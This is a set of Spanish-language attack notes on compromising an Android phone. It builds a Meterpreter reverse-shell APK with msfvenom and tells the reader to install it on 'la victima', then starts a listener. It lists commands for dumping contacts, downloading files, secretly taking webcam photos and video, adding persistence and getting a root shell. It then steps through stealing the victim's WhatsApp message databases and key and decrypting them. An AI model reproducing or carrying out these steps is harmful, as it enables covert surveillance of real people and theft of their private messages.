msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.45 LPORT=4546 R > app.apk
copiar e instalar en la victima


service apache2 start
service postgresql start

msfconsole
use multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.0.45
set LPORT 4546
exploit
help

sysinfo >> informacion del sistema
pwd >> ruta actual
dump_contacts >> extraer contactos
download [carpeta o archivo]
webcam_snap >> sacar foto
webcam_stream >> ver camara

upload [ruta al archivo persistencia] [ruta actual]
entrar en la shell, buscar el archivo y ejecutarlo
sh archivo.sh
chack_root >> verificar si esta rooteado
shell >> acceder a la shell del sistema >> comandos comunes de linux

para el archivo persistencia
buscar apk y eliminamos
upload [ruta al .sh] [ruta destino]
para descargar > download
sh nombrearchivo.sh

WhatsApp
archivo msgstore.db.crypt12
ruta sdcard/WhatsApp/bases de datos

Pasos
1. apt-get install android-tools-adb-fastboot
2. extraer la llave
3. extraer la conversacion
4. ingresar los datos a la pagina http://whatcrypt.com/
5. Utilizar WhatsApp Viewer
 TENER EL TELEFONO EN MODO ROOT


desde meterpreter
cd /
cd sdcard
cd android
cd ..
cd sdcard0
cd WhatsApp
cd Databases
download msgstore.db.crypt12

extraer key
shell
su
cd /data/data/com.whatsapp/files
cp key /storage/sdcard0/
ctrl+c y

en meterpreter
download key

los archivos ya los tenemos en kali

entrar a whatcrypt.com y elegir upload your crypt12 key
subir la key
elegir decrypt whatsapp database
subir la base de datos

se descarga desencriptada

descomprimimos
abrimos evaluacion de bases de datos > sqlite database browser
open base de datos desencriptada
browse data > messages o messages_fts

otro metodo para desencriptar
cd /data/data/com.whatsapp/database/
cp nombre.db/storage/sdcard1/
luego extraer

lo que hizo:
cd storage/sdcard1
download msgstore.db
download axolotl.db
download wa.db
download chatsettings.db

abrir sqlite database browser
open database > todas e inspeccionar
SIGUE TODO ENCRIPTADO

